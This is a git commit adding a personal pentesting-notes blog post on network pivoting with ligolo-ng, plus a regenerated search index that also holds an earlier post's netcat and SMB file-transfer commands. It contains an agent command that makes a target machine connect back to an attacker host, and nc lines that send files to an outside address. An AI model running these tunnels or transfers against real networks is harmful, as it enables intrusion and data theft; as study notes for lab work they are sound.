4f633f94eff8a37453717a69704ed791a5dd5fe9
eoniboogie <monkey9327@gmail.com>
2026-02-23 11:22:07 +0900

    pivot

---
+++ content/posts/pivoting.md
@@ -0,0 +1,46 @@
++++
+date = '2026-02-23T11:11:32+09:00'
+draft = false
+title = 'Pivoting'
+tags = ["ligolo"]
++++
+
+# ligolo-ng
+
+1. Set a proxy server
+
+`sudo ./proxy -selfcert -laddr "0.0.0.0:7878"`
+
+2. Create an interface
+
+`interface_create --name "evil-cha"`
+
+3. Add route (Target's *internal* network)
+
+`interface_add_route --name evil-cha --route 10.10.11.0/24`
+
+4. Access to the proxy server from the target machine
+
+`./agent -connect 10.10.14.3:11601 -ignore-cert`
+
+5. Check sessions from the proxy
+
+`sessoins`
+
+6. Start tunneling
+
+`tunnel_start --tun evil-cha`
+
+---
+
+For local port forwarding.
+
+- from kali terminal
+
+`sudo ip route add 240.0.0.1/32 dev evil-cha`
+
+or 
+
+- from ligolo proxy interface
+
+`interface_add_route --name hong --route 240.0.0.1/32`
--- public/searchindex.en.js
+++ public/searchindex.en.js
@@ -8,6 +8,40 @@ var relearn_searchindex = [
     "uri": "/index.html"
   },
   {
+    "breadcrumb": "Dragonfly Commando \u003e Tags",
+    "content": "",
+    "description": "",
+    "tags": [],
+    "title": "Tag :: Ligolo",
+    "uri": "/tags/ligolo/index.html"
+  },
+  {
+    "breadcrumb": "Dragonfly Commando \u003e Posts",
+    "content": "ligolo-ng Set a proxy server ./proxy -selfcert -laddr \"0.0.0.0:7878\"\nCreate an interface interface_create --name \"evil-cha\"\nAdd route (Target’s internal network) interface_add_route --name evil-cha --route 10.10.11.0/24\nAccess to the proxy server from the target machine ./agent -connect 10.10.14.3:11601 -ignore-cert\nCheck sessions from the proxy sessoins\nStart tunneling tunnel_start --tun evil-cha\nFor local port forwarding.\nfrom kali terminal sudo ip route add 240.0.0.1/32 dev evil-cha\nor\nfrom ligolo proxy interface interface_add_route --name hong --route 240.0.0.1/32",
+    "description": "ligolo-ng Set a proxy server ./proxy -selfcert -laddr \"0.0.0.0:7878\"\nCreate an interface interface_create --name \"evil-cha\"\nAdd route (Target’s internal network) interface_add_route --name evil-cha --route 10.10.11.0/24\nAccess to the proxy server from the target machine ./agent -connect 10.10.14.3:11601 -ignore-cert\nCheck sessions from the proxy sessoins\nStart tunneling tunnel_start --tun evil-cha\nFor local port forwarding.\nfrom kali terminal sudo ip route add 240.0.0.1/32 dev evil-cha",
+    "tags": [
+      "Ligolo"
+    ],
+    "title": "Pivoting",
+    "uri": "/posts/pivoting/index.html"
+  },
+  {
+    "breadcrumb": "Dragonfly Commando",
+    "content": "",
+    "description": "",
+    "tags": [],
+    "title": "Posts",
+    "uri": "/posts/index.html"
+  },
+  {
+    "breadcrumb": "Dragonfly Commando",
+    "content": "",
+    "description": "",
+    "tags": [],
+    "title": "Tags",
+    "uri": "/tags/index.html"
+  },
+  {
     "breadcrumb": "Dragonfly Commando \u003e Posts",
     "content": "SMB set up SMB server on kali\nimpacket-smbserver test . -smb2support -user user -password 1234\nConnect to the SMB from windows\nnet use Z: \\\\192.168.45.211\\test /user:user 1234\nnc linux file receiver\nnc -lp 1234 \u003e file.txt\nfile sender\nnc -q 0 192.168.45.211 1234 \u003c file.txt\nwindows file receiver\nnc -lp 1234 \u003e file.txt\nfile sender\nnc.exe -w 1 192.168.45.211 1234 \u003c file.txt",
     "description": "SMB set up SMB server on kali\nimpacket-smbserver test . -smb2support -user user -password 1234\nConnect to the SMB from windows\nnet use Z: \\\\192.168.45.211\\test /user:user 1234\nnc linux file receiver",
@@ -27,28 +61,12 @@ var relearn_searchindex = [
     "uri": "/tags/nc/index.html"
   },
   {
-    "breadcrumb": "Dragonfly Commando",
-    "content": "",
-    "description": "",
-    "tags": [],
-    "title": "Posts",
-    "uri": "/posts/index.html"
-  },
-  {
     "breadcrumb": "Dragonfly Commando \u003e Tags",
     "content": "",
     "description": "",
     "tags": [],
     "title": "Tag :: Smbserver",
     "uri": "/tags/smbserver/index.html"
-  },
-  {
-    "breadcrumb": "Dragonfly Commando",
-    "content": "",
-    "description": "",
-    "tags": [],
-    "title": "Tags",
-    "uri": "/tags/index.html"
   },
   {
     "breadcrumb": "Dragonfly Commando",
